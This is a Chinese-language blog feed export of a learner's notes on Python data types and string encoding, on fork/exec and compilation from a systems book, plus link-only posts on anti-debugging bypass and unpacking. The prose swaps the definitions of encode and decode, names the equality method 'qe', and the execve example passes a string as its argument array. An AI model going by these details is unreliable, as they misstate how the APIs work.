<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l.sort()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div></pre></td></tr></table></figure>
</li>
<li><p>array<br>数组, 处理较大数据,只能存储同一类型的, 看起来就比较底层比较快<br>大数据处理还会用到<code>NumPy</code>和<code>SciPy</code>库, 准备用到的时候再去学</p>
</li>
<li><p>collections.deque</p>
</li>
</ol>
<p>列表常常用来存一些相同类型的元素, 像是数组<br>而元祖更像是字段表的感觉,常存一些不同类型的</p>
<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>py里可映射类型都是dict实现的</p>
<p>dict是<code>{key: value}</code>形式, 要求<code>key</code>是<code>可散列数据结构</code></p>
<p>可散列数据结构</p>
<ul>
<li>在对象生命周期里,他的散列值不变</li>
<li>对象要实现<strong>hash</strong>()方法</li>
<li>要有<strong>qe</strong>()方法</li>
</ul>
<p>python里的不可变类型是可散列数据结构, 对于<code>tuple</code>, 要<code>tuple</code>包含的所有元素都是不可变类型的时候他才算是可散列的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>hash((<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>))</div><div class="line"><span class="number">2528502973977326415</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>hash((<span class="number">1</span>, [<span class="number">2</span>, <span class="number">3</span>]))</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">TypeError: unhashable type: <span class="string">'list'</span></div></pre></td></tr></table></figure></p>
<p>创建dict<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = dict(one=<span class="number">1</span>, two=<span class="number">2</span>, three=<span class="number">3</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = &#123;<span class="string">'one'</span>: <span class="number">1</span>, <span class="string">'two'</span>: <span class="number">2</span>, <span class="string">'three'</span>: <span class="number">3</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = dict(zip([<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'three'</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]))</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = dict([(<span class="string">'two'</span>, <span class="number">2</span>), (<span class="string">'one'</span>, <span class="number">1</span>), (<span class="string">'three'</span>, <span class="number">3</span>)])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>e = dict(&#123;<span class="string">'three'</span>: <span class="number">3</span>, <span class="string">'one'</span>: <span class="number">1</span>, <span class="string">'two'</span>: <span class="number">2</span>&#125;)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a == b == c == d == e</div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure></p>
<p>dict也能够推倒(ﾉ*･ω･)ﾉ,ahhh)</p>
<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>集合可以用于去重, 这操作…<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>list(set([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]))</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div></pre></td></tr></table></figure></p>
<p>另外set的元素要是可散列的<br>set本身是不可散列的<br>但…frozenset可以散列<br>所以set里不能包含set, 但可以包含emmmm, frozenset</p>
<p>集合操作</p>
<ul>
<li><code>|</code> 并集</li>
<li><code>&amp;</code> 交集</li>
<li><code>-</code> 差集</li>
</ul>
<p>集合字面量<code>{1, 2, 3}</code>, 空集是<code>set()</code>, 而不能写成<code>{}</code>, 因为<code>{}</code>是空的dict</p>
<p>集合也能推倒…</p>
<h3 id="dict-amp-set-和-散列表"><a href="#dict-amp-set-和-散列表" class="headerlink" title="dict &amp; set 和 散列表"></a>dict &amp; set 和 散列表</h3><p>dict 和 set很快, 因为他们背后是散列表<br>set其实大概相当于是只有<code>key</code>的一个dict,(或者叫做不关注其<code>value</code>)</p>
<p>我还以为里面是树实现的…C++ 里map应该是树实现的吧</p>
<p>树来实现的话应该会比单纯的稀疏散列表要省下很多内存…</p>
<p>书中也提到了python字典在内存的开销上巨大</p>
<p>不过散列表以空间换时间, 是不是查询比树要快</p>
<p>散列表查询是直接线性的复杂度, 算是O(1)…?<br>如果这样子的话…那真的是快…</p>
<h2 id="总结一下-这个字面量"><a href="#总结一下-这个字面量" class="headerlink" title="总结一下,这个字面量"></a>总结一下,这个字面量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]   <span class="comment"># list</span></div><div class="line"></div><div class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment">#tuple</span></div><div class="line">(<span class="number">1</span>, ) <span class="comment"># tuple</span></div><div class="line">(<span class="number">1</span>) <span class="comment"># 就是1, 数字</span></div><div class="line"></div><div class="line">&#123;<span class="number">1</span>: <span class="number">1</span>, <span class="number">2</span>: <span class="number">2</span>&#125; <span class="comment"># dict</span></div><div class="line">&#123;&#125;          <span class="comment"># dict</span></div><div class="line"></div><div class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;    <span class="comment"># set</span></div></pre></td></tr></table></figure>
<h2 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h2><p>二进制序列类型</p>
<ul>
<li>bytes 不可变</li>
<li>bytearray 可变</li>
</ul>
<p>试验了下…这个东西对py2的支持不太好, py2还是str比较常用<br>字面量形式是<code>b&#39;somestr&#39;</code>, 下面都来自py3<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>bytes.fromhex(<span class="string">'31 32 33 34'</span>)</div><div class="line"><span class="string">b'1234'</span></div></pre></td></tr></table></figure></p>
<p>处理二进制数据常用struct和memoryview</p>
<p>在py2里, 看起来这个<code>bytes</code>是<code>str</code>接管了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>type(base64.b64encode(<span class="string">'abc'</span>))</div><div class="line">&lt;type <span class="string">'str'</span>&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>type(base64.b64encode(<span class="string">b'abc'</span>))</div><div class="line">&lt;type <span class="string">'str'</span>&gt;</div></pre></td></tr></table></figure></p>
<p>在py3里, 这里才出现了<code>bytes</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>type(base64.b64encode(<span class="string">'abc'</span>))</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">  File <span class="string">"/usr/lib/python3.5/base64.py"</span>, line <span class="number">59</span>, <span class="keyword">in</span> b64encode</div><div class="line">    encoded = binascii.b2a_base64(s)[:<span class="number">-1</span>]</div><div class="line">TypeError: a bytes-like object <span class="keyword">is</span> required, <span class="keyword">not</span> <span class="string">'str'</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>type(base64.b64encode(<span class="string">b'abc'</span>))</div><div class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">bytes</span>'&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="编码-解码"><a href="#编码-解码" class="headerlink" title="编码 解码"></a>编码 解码</h3><p>编码encode: 字节序列 -&gt; 文本字符串<br>解码decode: 文本字符串 -&gt; 字节序列<br>emmmmmm…. 这个在py2有点迷<br>py3的话<br>encode只存在于<code>str</code>, 即为<code>bytes str.encode(args)</code><br>decode只存在于<code>bytes</code>, 即为<code>str bytes.decode(args)</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'a'</span>.encode(<span class="string">'utf8'</span>)</div><div class="line"><span class="string">b'a'</span></div><div class="line"><span class="comment"># encode: str -&gt; bytes</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b'a'</span>.decode(<span class="string">'utf8'</span>)</div><div class="line"><span class="string">'a'</span></div><div class="line"><span class="comment"># decode: bytes -&gt; str</span></div></pre></td></tr></table></figure></p>
<p>而且.这个args只能是<code>text encode</code>, 不能是<code>hex</code>之类的….<br>另外, 一般的比如utf-8有很多别名可以用: <code>utf8</code>, <code>utf_8</code>, <code>utf-8</code>, <code>U8</code></p>
<p>现在没网..不过估计..应该是py2这一块比较混乱, 所以py3把encode, decode这一块功能单一化了<br>根据错误提示…应该是是放到<code>codecs.decode</code>和<code>codecs.encode</code>了</p>
<blockquote>
<p>py2 默认编码是ascii, py3默认编码是utf8</p>
</blockquote>
<p>先跳过这一块…这…感觉文本处理, 还是推荐使用py3的感觉</p>
<p>开始是用<code>help(&#39;str&#39;)</code>来找到<code>encode</code>和<code>decode</code>的帮助…然后才发现这样子更好<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">''</span>.encode.__doc__</div><div class="line">S.encode([encoding[,errors]]) -&gt; object</div><div class="line"></div><div class="line">Encodes S using the codec registered <span class="keyword">for</span> encoding. encoding defaults</div><div class="line">to the default encoding. errors may be given to set a different error</div><div class="line">handling scheme. Default <span class="keyword">is</span> <span class="string">'strict'</span> meaning that encoding errors <span class="keyword">raise</span></div><div class="line">a UnicodeEncodeError. Other possible values are <span class="string">'ignore'</span>, <span class="string">'replace'</span> <span class="keyword">and</span></div><div class="line"><span class="string">'xmlcharrefreplace'</span> <span class="keyword">as</span> well <span class="keyword">as</span> any other name registered <span class="keyword">with</span></div><div class="line">codecs.register_error that <span class="keyword">is</span> able to handle UnicodeEncodeErrors.</div></pre></td></tr></table></figure></p>
<p>我蠢了…<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>help(<span class="string">''</span>.encode)</div></pre></td></tr></table></figure></p>
<p>这样子help得到的结果好像是就是<code>__doc__</code>过来的</p>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>抄书上的一个例子<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_averager</span><span class="params">()</span>:</span></div><div class="line">    series = []</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">averager</span><span class="params">(new_value)</span>:</span></div><div class="line">        series.append(new_value)</div><div class="line">        total = sum(series)</div><div class="line">        <span class="keyword">return</span> total/len(series)</div><div class="line">    <span class="keyword">return</span> averager</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[流畅的python-读书笔记]]></title>
      <url>/2017/08/09/%E6%B5%81%E7%95%85%E7%9A%84python-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[读书笔记-静态链接]]></title>
      <url>/2017/08/06/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[使用LD_PRELOAD来bypass掉反调试]]></title>
      <url>/2017/08/05/%E4%BD%BF%E7%94%A8LD-PRELOAD%E6%9D%A5bypass%E6%8E%89%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
      <content type="html"><![CDATA[<p>读了几篇文章,感觉好像确实,emmmm,可以诶</p>
<p>查了查资料…原来这就算是<code>Linux hook</code>了…所以查找了些资料</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.csdn.net/yyttiao/article/details/7391831" target="_blank" rel="external">http://blog.csdn.net/yyttiao/article/details/7391831</a> (一个系列的文章)<br><a href="http://www.cnblogs.com/LittleHann/p/3854977.html" target="_blank" rel="external">http://www.cnblogs.com/LittleHann/p/3854977.html</a> (一个总结)<br><a href="http://blog.csdn.net/u012301943/article/details/25830229" target="_blank" rel="external">http://blog.csdn.net/u012301943/article/details/25830229</a><br><a href="http://manoharvanga.com/hackme/" target="_blank" rel="external">http://manoharvanga.com/hackme/</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[mark一下最近看到的文章]]></title>
      <url>/2017/08/05/mark%E4%B8%80%E4%B8%8B%E6%9C%80%E8%BF%91%E7%9C%8B%E5%88%B0%E7%9A%84%E6%96%87%E7%AB%A0/</url>
      <content type="html"><![CDATA[<ol>
<li><a href="http://manoharvanga.com/hackme/" target="_blank" rel="external">http://manoharvanga.com/hackme/</a><br>译文 <a href="http://blog.csdn.net/fisher_jiang/article/details/6783922" target="_blank" rel="external">http://blog.csdn.net/fisher_jiang/article/details/6783922</a><br>里面有作者如何bypass反调试的各种技巧以及..以及请点击看原文</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[程序员的自我修养 读书笔记]]></title>
      <url>/2017/08/05/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h3><p>一个标准的线程由 线程ID, 当前指令指针(PC), 寄存器集合, 堆栈组成<br>各个进程独享的资源有</p>
<ul>
<li>栈</li>
<li>寄存器</li>
</ul>
<p>各个线程间共享程序的内存空间和一些进程间级的资源,具体来说是</p>
<ul>
<li>代码段</li>
<li>数据段</li>
<li>堆</li>
</ul>
<h3 id="c程序员角度来看"><a href="#c程序员角度来看" class="headerlink" title="c程序员角度来看"></a>c程序员角度来看</h3><table>
<thead>
<tr>
<th>线程私有</th>
<th>线程间共享 </th>
</tr>
</thead>
<tbody>
<tr>
<td>局部变量</td>
<td>全局变量</td>
</tr>
<tr>
<td>函数参数</td>
<td>堆上的数据</td>
</tr>
<tr>
<td>TLS数据</td>
<td>函数里的静态变量</td>
</tr>
<tr>
<td></td>
<td>程序代码</td>
</tr>
<tr>
<td></td>
<td>打开的文件(进程级资源)</td>
</tr>
</tbody>
</table>
<p>这个说A线程打开的文件,B线程可以进行读写</p>
<h3 id="windows多线程"><a href="#windows多线程" class="headerlink" title="windows多线程"></a>windows多线程</h3><p>CreateProcess 创建进程<br>CreateThread  创建线程</p>
<h3 id="Linux多线程"><a href="#Linux多线程" class="headerlink" title="Linux多线程"></a>Linux多线程</h3><p>没有明确的进程和线程的概念<br>所有执行实体是叫做任务(Task), 每个任务相当于是一个单线程的进程, 不同任务可以<code>选择</code>共享内存空间,共享了内存空间的Task就相当于是构成了一个进程,这些Task相当于是线程</p>
<table>
<thead>
<tr>
<th>系统调用</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>fork</td>
<td>复制当前进程</td>
</tr>
<tr>
<td>exec</td>
<td>使用新的可执行映像覆盖当前可执行映像</td>
</tr>
<tr>
<td>clone</td>
<td>创建子进程并从指定位置开始执行</td>
</tr>
</tbody>
</table>
<p>fork产生一个完全一样的新进程<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">pid_t</span> pid;</div><div class="line"><span class="keyword">if</span>(pid = fork()) &#123;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>fork 和 exec 一起使用可以产生新的任务<br><code>fork</code>产生的新进程和原来的进程共享<code>写时复制</code>的内存空间,当对内存修改的时候才进行内存空间复制</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><blockquote>
<p>Linux下不存在exec这个函数…所以直接exec会报错</p>
</blockquote>
<p>exec是一组函数,他们是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">execl</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">const</span> <span class="keyword">char</span> *arg, ...)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">execlp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">const</span> <span class="keyword">char</span> *arg, ...)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">execle</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">const</span> <span class="keyword">char</span> *arg, ..., <span class="keyword">char</span> * <span class="keyword">const</span> envp[])</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">execv</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *<span class="keyword">const</span> argv[])</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">execvp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">char</span> *<span class="keyword">const</span> argv[])</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">execvpe</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</div></pre></td></tr></table></figure></p>
<p><code>l</code>: 可变长参数<br><code>p</code>: 会搜索环境变量找到<code>file</code><br><code>e</code>: 可自设环境变量</p>
<p>另外还有一个<code>系统调用</code>execve<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</div></pre></td></tr></table></figure></p>
<p>上面的6个exec系列是包装了<code>execve</code></p>
<h4 id="exec-和-fork一起使用"><a href="#exec-和-fork一起使用" class="headerlink" title="exec 和 fork一起使用"></a>exec 和 fork一起使用</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* **********************************************</span></div><div class="line"><span class="comment">Auther: haibin</span></div><div class="line"><span class="comment">Created Time: 2017年08月05日 星期六 16时08分02秒</span></div><div class="line"><span class="comment">File Name   : thread.c</span></div><div class="line"><span class="comment">*********************************************** */</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">pid_t</span> pid = fork();</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"fork Error\n"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"I'm son\n"</span>);</div><div class="line">        execve(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</div><div class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"I'm son\n"</span>); <span class="comment">//不会执行</span></div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"I'm father\n"</span>);</div><div class="line">        wait();</div><div class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"I'm father\n"</span>); <span class="comment">//会执行</span></div><div class="line">        &#125; </div><div class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="exec-和-system"><a href="#exec-和-system" class="headerlink" title="exec 和 system"></a>exec 和 system</h4><p>system相当于是重新开了一个进程,对于原来进程逻辑没有影响<br>所以上面的例子里如果不用execve而是用了<code>system(&quot;bin/sh&quot;)</code>的话,下面的<code>i&#39;m son</code>也还是会输出的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">system</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *command)</span></span>;</div></pre></td></tr></table></figure>
<p>相当于执行了<code>/bin/sh -c command</code><br>system在执行时候相当于会调用<code>fork</code>, <code>execve</code>, <code>waitpid</code><br><code>system(&quot;command&quot;)</code>相当于是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">pid_t</span> pid = fork();</div><div class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</div><div class="line">    ... <span class="comment">//创建失败</span></div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</div><div class="line">    <span class="comment">// 新任务</span></div><div class="line">    execl(<span class="string">"bin/sh"</span>, <span class="string">"sh"</span>, <span class="string">"-c"</span>, command, <span class="literal">NULL</span>);</div><div class="line">    ...</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    ...</div><div class="line">    <span class="comment">// 这里是原任务, pid 是新任务的pid</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>是不是有点迷之奇怪…<br>fork调用后<br>本任务的fork会返回新任务的pid<br>新任务的fork会返回0<br>所以使用fork和exec新建进程其实就是这个样子写的…</p>
<h3 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h3><p>多线程对于可共享的变量的读写可能导致数据的不一致性</p>
<ol>
<li>使用操作系统提供的原子操作</li>
<li>使用锁</li>
<li>使用可重入的函数</li>
</ol>
<h4 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h4><p>这个..其实面试的时候被问到了这个问题,我不会,惨…<br>这个关键字是为shi了tu阻止过度优化而造成的线程安全问题<br>具体可以做到</p>
<ul>
<li>阻止编译器为了提高速度将一个变量缓存到寄存器而不写回</li>
<li>阻止编译器调整操作volatile变量的指令顺序</li>
</ul>
<p>但即使volatile能阻止编译器调整顺序,也不能够阻止CPU动态调度,所以不能完全解决这个由于优化导致的线程安全问题</p>
<h2 id="第二章-静态链接"><a href="#第二章-静态链接" class="headerlink" title="第二章 静态链接"></a>第二章 静态链接</h2><p>四步走</p>
<blockquote>
<p>gcc其实是包装了预编译器cc1, 汇编器as, 链接器ld这些,根据参数不同调用不同的程序</p>
</blockquote>
<ol>
<li>预编译(Prepressing)<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$gcc</span> -E hello.c -o hello.i</div></pre></td></tr></table></figure>
</li>
</ol>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$cpp</span> hello.c &gt; hello.i</div></pre></td></tr></table></figure></p>
<p>展开宏定义和处理其他以<code>#</code>开头的预编译指令<br>但保留<code>#pragma</code>, 因为在编译时候还要用到</p>
<ol>
<li>编译(Compliation)<br>结果一堆复杂的分析(语法,词法,语义…)产生汇编代码<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$gcc</span> -S hello.i -o hello.S</div></pre></td></tr></table></figure>
</li>
</ol>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$gcc</span> -S hello.c -o hello.S</div></pre></td></tr></table></figure></p>
<ol>
<li>汇编(Assembly)<br>汇编代码转化为机器代码, 这个步骤比较简单<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$gcc</span> -c hello.S -o hello.o</div></pre></td></tr></table></figure>
</li>
</ol>
<p>产生了目标文件<br>也可以从源文件直接过来<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$gcc</span> -c hello.c -o hello.o</div></pre></td></tr></table></figure></p>
<ol>
<li>链接(Linking)<blockquote>
<p>为什么不由汇编直接输出可执行文件而是输出一个目标文件<br>目标代码中有变量定义在其他模块,这些变量的地址在编译期间不能确定的</p>
</blockquote>
</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[RE入门]]></title>
      <url>/2017/08/02/RE%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>学习计划</p>
<h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p><a href="http://bbs.pediy.com/thread-20366.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-20366.htm</a><br>这个看了还是一头雾水…在网上down了一份pdf,叫做脱壳的艺术,正在读(百度随便搜)</p>
<h2 id="反静态-反调试-壳"><a href="#反静态-反调试-壳" class="headerlink" title="反静态 反调试 壳"></a>反静态 反调试 壳</h2><p><a href="http://bbs.pediy.com/thread-66575.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-66575.htm</a><br>这个很不错,感觉,讲的,emmmmm,开心</p>
<p>如果<code>反静态 + 反调试 + 壳</code>, 这个时候不能脱壳的话,岂不是GG了, 如果能脱壳,应该就能把反调试patch掉吧,之后动态调试…<br>其实壳好多就算是反静态的吧, 脱壳并且dump就能对抗反静态是这个意思吗</p>
